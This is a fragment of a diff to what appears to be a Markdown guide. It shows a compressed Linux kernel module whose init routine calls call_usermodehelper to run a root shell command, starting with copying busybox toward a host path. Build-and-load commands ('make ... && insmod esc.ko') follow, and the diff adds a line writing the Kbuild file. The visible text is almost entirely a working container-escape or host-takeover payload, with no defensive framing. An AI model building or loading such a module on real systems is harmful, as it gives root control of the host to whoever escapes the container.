@@ -24,6 +24,7 @@ static int __init e(void){ char *a[]={"/bin/sh","-c","cp /bin/busybox /host_mark
   char *env[]={"PATH=/sbin:/bin",NULL}; call_usermodehelper(a[0],a,env,UMH_WAIT_EXEC); return 0;}
 static void __exit x(void){} module_init(e); module_exit(x); MODULE_LICENSE("GPL");
 C
+echo 'obj-m := esc.o' > Kbuild
 make -C /lib/modules/$(uname -r)/build M=$PWD modules && insmod esc.ko
 ```
 
